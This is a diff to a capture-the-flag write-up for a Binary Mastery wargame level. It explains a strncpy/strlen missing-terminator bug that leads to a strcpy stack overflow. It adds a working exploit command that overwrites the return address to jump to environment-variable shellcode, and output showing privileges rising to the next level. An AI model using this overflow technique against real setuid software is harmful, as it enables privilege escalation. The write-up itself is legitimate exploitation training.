@@ -90,11 +90,50 @@ int main(int argc, char** argv) {
 ```
 
 
-* So the call to **strncpy(buf3, a, sizeof(buf3)) [1]** will **not** add a null terminator if parameter **a** (first user input!) is exactly 16 characters.
-* Following this, the call to **strlen(buf3) [2]** will go over the bounds of the string **buf3** (no null terminator for _buf3_) and will return a larger value than expected. 
+* So the call to **strncpy(buf3, a, sizeof(buf3)) [1]** will **not** add a null terminator to **buf3** if parameter **a** (first user input!) is exactly 16 characters.
+* Following this, the call to **strlen(buf3) [2]** will go over the bounds of the string **buf3** (no null terminator for **buf3**) and will return a larger value than expected. 
 * This will lead to the execution of the **strcpy(buf1, b) [3]** call, which will overflow **buf1** with **b** (second user input), thus giving us the posibility to control again the return address from function **foo**.
 
 
 ## 2 - Exploit
 
+For all the steps describe before to work, the layot of the stack of function **foo** is very important. Let's check that in IDA. After a bit of renaming, the variables on stack look like this: 
+
+![Logo](/assets/images/bm3-1.png)
+
+Steps:
+* We need a payload of 16 characters in **a**
+* We need to put 32 bytes in **buf1** from **b** in order to overwrite the return address. 
+* We'll use the same trick with the shellcode placed in an environment variable
+
+```bash
+$ ./level3 $(python -c 'print "B"*16') $(python -c 'print "C"*32 + "\xd3\xd8\xff\xff"')
+$ id
+uid=1004(level3) gid=1004(level3) euid=1005(level4) groups=1005(level4),1004(level3)
+```
+
 ## 3 - Profit
+
+```
+$ /home/level4/victory
+   ___  _                      __  ___         __
+  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
+ / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
+/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
+                     /___/                 _            /___/  
+                             ___ ___  ___ (_)__ ____    
+                            / -_) _ \(_-</ / _ `/ _ \   
+                            \__/_//_/___/_/\_, /_//_/   
+                                          /___/         
+                                          
+Subject: Victory!                         
+
+Congrats, you have solved level3. To update your score,
+send an e-mail to unlock@certifiedsecure.com and include:
+   * your CS-ID
+   * which level you solved (level3 @ binary mastery ensign)
+   * the exploit 
+   
+You can now start with level4. If you want, you can log in
+as level4 with password  [REDACTED] 
+```
